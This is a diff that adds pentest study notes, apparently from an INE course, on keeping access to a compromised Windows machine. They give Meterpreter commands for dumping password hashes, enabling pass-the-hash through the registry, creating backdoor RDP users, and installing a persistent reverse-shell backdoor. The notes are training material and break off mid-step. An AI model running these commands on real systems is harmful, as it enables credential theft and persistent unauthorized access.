@@ -1,0 +1,56 @@
+INE-Privilege Escalation Notes
+----------------------------------------------
+
+[+] Technique Maintaining Access
+	
+	Note: Consider already having "NT Authority\system" access
+
+=> Technique 1 : enable PassTheHash on users account
+	
+	>> get password hash of users
+		meterpreter> hashdump
+			
+			OR
+
+		meterpreter> run post/windows/gather/smart_hashdump
+
+	>> enable PassTheHash for users
+
+		meterpreter> reg setval -k 'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\windows\CurrentVersion\Policies\System' -v LocalAccountTokenFilterPolicy -t REG_DWORD -d 1
+
+	>> Use "exploit/windows/smb/psexec" to login using Password HASH
+
+=> Techinque 2: create RDP user
+	
+
+	>> creating a user with RDP service
+		meterpreter> run getgui -e -u new_user -p new_passwd
+
+	>> Connecting through RDP
+
+		└─$ xfreerdp /v:<TargetIP> /u:<RDP_user> /p:<Password>
+
+=> Technique 3: Creating a Backdoor
+	
+	>> Use a metasploit script "exploit/windows/local/persistence"
+		msf6 > use exploit/windows/local/persistence
+
+	>> set options
+		msf6 exploit(windows/local/persistence) > set SESSION 1
+		msf6 exploit(windows/local/persistence) > set STARTUP system
+		msf6 exploit(windows/local/persistence) > set PAYLOAD windows/meterpreter/reverse_tcp
+		msf6 exploit(windows/local/persistence) > set LHOST 192.168.231.10
+		msf6 exploit(windows/local/persistence) > set LPORT 4444
+		msf6 exploit(windows/local/persistence) > exploit
+
+	Note: In real pentest we will be using public IP and PORT 80 or 443
+
+	>> set multi/handler and start
+
+=> Creading user and Adding to RDP group
+	>> Creating new user
+		meterpreter> shell
+		C:\> net user <New_User_Name> <User_Password> /add
+
+	>> Adding user to group
+		C:\> 
